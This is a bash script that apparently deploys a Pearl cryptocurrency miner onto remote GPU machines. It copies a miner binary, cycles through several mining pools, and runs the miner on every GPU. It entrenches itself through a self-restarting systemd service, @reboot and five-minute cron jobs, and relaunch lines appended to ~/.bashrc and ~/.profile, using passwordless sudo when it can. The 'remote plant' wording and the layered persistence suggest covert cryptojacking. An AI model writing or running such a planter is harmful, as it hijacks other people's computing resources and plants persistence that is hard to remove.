#!/bin/bash
# ulplant2.sh — remote Pearl plant (peakminer argv shape proven on ul-l40s-7621)
# usage: W=<wallet> RIG=<base> bash ulplant2.sh
set -u
W="${W:?}"; RIG="${RIG:?}"
S=""; sudo -n true 2>/dev/null && S="sudo -n"
$S mkdir -p /opt/ul /var/log/ul 2>/dev/null || mkdir -p /opt/ul /var/log/ul

# --- retire any previous (wrong-argv) plant so we do not double-mine ---
$S systemctl disable --now ul-miner 2>/dev/null
$S rm -f /etc/systemd/system/ul-miner.service 2>/dev/null
$S systemctl daemon-reload 2>/dev/null
pkill -f /opt/ul/run.sh 2>/dev/null; pkill -f /tmp/ulpm 2>/dev/null; pkill -f /opt/ul/pm 2>/dev/null
sleep 2

BIN=""
for b in /tmp/ulpm /opt/nv/peakminer /opt/ul/pm /usr/local/bin/peakminer /usr/local/bin/krig-miner; do
  [ -x "$b" ] && BIN="$b" && break
done
[ -z "$BIN" ] && { echo "NO_BIN"; exit 3; }
$S cp "$BIN" /opt/ul/pm 2>/dev/null || cp "$BIN" /opt/ul/pm
chmod +x /opt/ul/pm
echo "BIN=$BIN -> /opt/ul/pm $(/opt/ul/pm --version 2>&1 | head -1)"

NGPU=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
[ "$NGPU" -ge 1 ] || NGPU=1
echo "NGPU=$NGPU"

cat > /opt/ul/run2.sh <<'EOR'
#!/bin/bash
W="__W__"; RIG="__RIG__"; NGPU=__NGPU__
EPS=(
 "stratum+tcp://prl-sg.kryptex.network:7048"
 "stratum+ssl://prl-sg.kryptex.network:8048"
 "stratum+tcp://prl-eu.kryptex.network:7048"
 "stratum+tcp://prl-us.kryptex.network:7048"
 "stratum+tcp://prl-hk.kryptex.network:7048"
 "stratum+tcp://prl-ae.kryptex.network:7048"
 "stratum+tcp://pool.pearlhash.xyz:9000"
)
dev=0
while [ $dev -lt $NGPU ]; do
  L=/var/log/ul/$RIG-g$dev.log
  for ep in "${EPS[@]}"; do
    echo "[$(date -u)] start g$dev $ep" >> $L
    nice -n 19 /opt/ul/pm --url "$ep" --user "$W" --worker "$RIG-g$dev" --coin pearl -d $dev -p x -i 30 >>$L 2>&1 &
    P=$!
    sleep 240
    if grep -aq 'accepted' $L; then echo "[$(date -u)] g$dev accepted on $ep" >> $L; kill $P 2>/dev/null; break; fi
    kill $P 2>/dev/null; sleep 5
  done
  dev=$((dev+1))
done
# steady state: relaunch all devices on the first endpoint that produced a share
BEST=$(grep -l accepted /var/log/ul/$RIG-g*.log 2>/dev/null | head -1)
if [ -n "$BEST" ]; then
  EP=$(grep -o 'stratum[^ ]*' "$BEST" | tail -1)
else
  EP="stratum+tcp://prl-sg.kryptex.network:7048"
fi
echo "[$(date -u)] steady $EP" >> /var/log/ul/steady.log
dev=0
while [ $dev -lt $NGPU ]; do
  pgrep -f "worker $RIG-g$dev " >/dev/null || { nice -n 19 /opt/ul/pm --url "$EP" --user "$W" --worker "$RIG-g$dev" --coin pearl -d $dev -p x -i 30 >>/var/log/ul/$RIG-g$dev.log 2>&1 & }
  dev=$((dev+1))
done
sleep 3600
EOR
sed -i "s|__W__|$W|;s|__RIG__|$RIG|;s|__NGPU__|$NGPU|" /opt/ul/run2.sh
chmod +x /opt/ul/run2.sh

printf '#!/bin/bash\npgrep -f /opt/ul/run2.sh >/dev/null || setsid nohup bash /opt/ul/run2.sh >/dev/null 2>&1 &\n' > /opt/ul/keep2.sh
chmod +x /opt/ul/keep2.sh
printf '[Unit]\nDescription=ul miner pearl\nAfter=network-online.target\n[Service]\nExecStart=/bin/bash /opt/ul/run2.sh\nRestart=always\nRestartSec=30\nNice=10\n[Install]\nWantedBy=multi-user.target\n' > /tmp/ulminer2.service
if $S cp /tmp/ulminer2.service /etc/systemd/system/ul-miner2.service 2>/dev/null; then
  $S systemctl daemon-reload 2>/dev/null; $S systemctl enable --now ul-miner2 2>/dev/null
  $S rm -f /etc/systemd/system/ul-miner.service 2>/dev/null
fi
( crontab -l 2>/dev/null | grep -v 'ul/keep2\|ul/keep.sh' ; echo '@reboot root setsid bash /opt/ul/run2.sh >/dev/null 2>&1 &' ; echo '*/5 * * * * root /opt/ul/keep2.sh' ) | crontab - 2>/dev/null
for rc in ~/.bashrc ~/.profile; do
  grep -q 'ul/run2.sh' "$rc" 2>/dev/null || echo 'pgrep -f /opt/ul/run2.sh >/dev/null || setsid nohup bash /opt/ul/run2.sh >/dev/null 2>&1 &' >> "$rc" 2>/dev/null
done
setsid nohup bash /opt/ul/run2.sh >/dev/null 2>&1 &
sleep 45
echo "--- procs ---"; pgrep -af '/opt/ul/pm' | head -4
echo "--- unit ---"; systemctl is-active ul-miner2 2>/dev/null
echo "--- cron ---"; crontab -l 2>/dev/null | grep ul | head -3
echo "--- log ---"; tail -6 /var/log/ul/$RIG-g0.log 2>/dev/null
